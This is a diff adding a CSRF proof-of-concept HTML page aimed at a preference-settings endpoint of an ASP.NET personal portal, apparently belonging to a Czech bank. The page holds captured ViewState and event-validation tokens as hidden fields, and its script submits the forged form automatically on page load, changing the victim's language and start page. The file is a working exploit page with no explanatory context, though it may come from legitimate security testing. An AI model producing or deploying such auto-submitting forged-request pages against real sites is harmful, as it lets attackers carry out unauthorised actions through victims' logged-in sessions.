@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form action="https://testezam/OsobniPortal/portal/NastaveniPreference.aspx" method="POST" id="csrfForm">
+        <input type="hidden" name="__EVENTTARGET" value="ctl00$cph$lbtOK">
+        <input type="hidden" name="__EVENTARGUMENT" value="">
+        <input type="hidden" name="__LASTFOCUS" value="">
+        <input type="hidden" name="__VIEWSTATE" value="/wEPDwULLTE2MTY5ODg2NDYPZBYCZg9kFgQCAQ9kFgQCAQ8WAh4EaHJlZgURLi4vY3NzL21vbmV0YS5jc3NkAgIPFgIfAAUXLi4vY3NzL21vbmV0YV9wcmludC5jc3NkAgMPZBYCAgEPFgIeBXN0eWxlBQd3aWR0aDo7FhACAQ8PFgIeBFRleHQFMTxzcGFuIGNsYXNzPSJvcmFuZ2UiPlA8L3NwYW4+b3J0w6FsIGVaYW3Em3N0bmFuZWNkZAIDDw8WAh8CBRhNT05FVEEgTW9uZXkgQmFuaywgYS4gcy5kZAIFDw8WAh8CBRBQxZlpaGzDocWhZW4oYSk6ZGQCBw8PFgIfAgUJS3Vwc2EgSmFuZGQCCQ8QZBAVAgbEjGVza3kHRW5nbGlzaBUCATABMhQrAwJnZxYBZmQCCw9kFgoCAQ8PFgIfAgURw5p2b2Ruw60gc3Ryw6Fua2FkZAIDDxYCHgdWaXNpYmxlaBYCZg8PFgIfAgUMWm3Em25hIGhlc2xhZGQCBQ8WAh8DaBYCZg8PFgIfAgUMT2RobMOhxaFlbsOtZGQCBw8PFgIfAgUKTmFzdGF2ZW7DrWRkAgkPZBYCZg8PFgQfAgUJZUxlYXJuaW5nHwNoZGQCDQ8PFgIfAgUIxaDDrcWZa2FkZAIPD2QWEAIBDw8WAh8CBTRPc29ibsOtIG5hc3RhdmVuw60gcG9ydMOhbHUgcHJvIHXFvml2YXRlbGU6S3Vwc2EgSmFuZGQCAw8PFgIfAgUjUG8gcMWZaWhsw6HFoWVuw60gem9icmF6aXQgc3Ryw6Fua3VkZAIFDxBkDxYIZgIBAgICAwIEAgUCBgIHFggQBQMtLS0FGn4vcG9ydGFsL29zb2JuaXBvcnRhbC5hc3B4ZxAFF0RlbGVnb3bDoW7DrSBwcmF2b21vY8OtBSB+L1BvcnRhbC9QcmF2b21vY0RlbGVnb3ZhbmkuYXNweGcQBRRNb2plIHByYWNvdm7DrSBjZXN0eQUSfi9jZXN0eS9jZXN0eS5hc3B4ZxAFHlphZMOhbsOtIG5vdsOpIHByYWNvdm7DrSBjZXN0eQUYfi9jZXN0eS9jZXN0YXByaWthei5hc3B4ZxAFHlNjaHZhbG92w6Fuw60gcHJhY292bsOtY2ggY2VzdAUdfi9jZXN0eS9jZXN0YXNjaHZhbG92YW5pLmFzcHhnEAUPRHJvYm7DqSB2w71kYWplBR9+L0Ryb2JuZVZ5ZGFqZS9WeWRhalNlem5hbS5hc3B4ZxAFJcW9w6Fkb3N0IG8gesOhbG9odSBuYSBkcm9ibsOpIHbDvWRhamUFH34vRHJvYm5lVnlkYWplL1Z5ZGFqWmFkb3N0LmFzcHhnEAUgU2NodmFsb3bDoW7DrSBkcm9ibsO9Y2ggdsO9ZGFqxa8FJH4vRHJvYm5lVnlkYWplL1Z5ZGFqU2NodmFsb3ZhbmkuYXNweGcWAWZkAgcPDxYCHwIFG1bDvWNob3rDrSDFocOtxZlrYSBzdHLDoW5la2RkAgsPDxYCHwIFJ1N0csOhbmt5IHXFvml2YXRlbGkgem9icmF6b3ZhdCB2IGphenljZWRkAg0PEGQQFQIGxIxlc2t5B0VuZ2xpc2gVAgEwATIUKwMCZ2dkZAIPDw8WAh8CBQdVbG/Fvml0ZGQCEQ8PFgIfAgUFWnDEm3RkZGSzhtLxY4zk/FYKflIDk9Hr5k9OTg==">
+        <input type="hidden" name="__VIEWSTATEGENERATOR" value="C68D4862">
+        <input type="hidden" name="__EVENTVALIDATION" value="/wEWFgL7xqi4CwLDn9C8BgK55+HkDAKpiMsKAreIywoCp92DrAcCx8XhuAQCzq/HyggC3PLUagK8l+G6DQLxgoHeAgKorcjVCwLflrXCDQKhyY6xDwLo2POqDQL/jo7QAQLS1vnMAwLz2PfzAQLjt92dDQL9t92dDQLmwOG1DQKb09PADWwAX+KGq/0bjz6fujbmCaNHEYSR">
+        <input type="hidden" name="ctl00$ddlJazyk" value="0">
+        <input type="hidden" name="ctl00$cph$ddlStartPages" value="~/portal/osobniportal.aspx">
+        <input type="hidden" name="ctl00$cph$txtDefaultPageWidth$txt" value="">
+        <input type="hidden" name="ctl00$cph$ddlJazyk" value="2">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
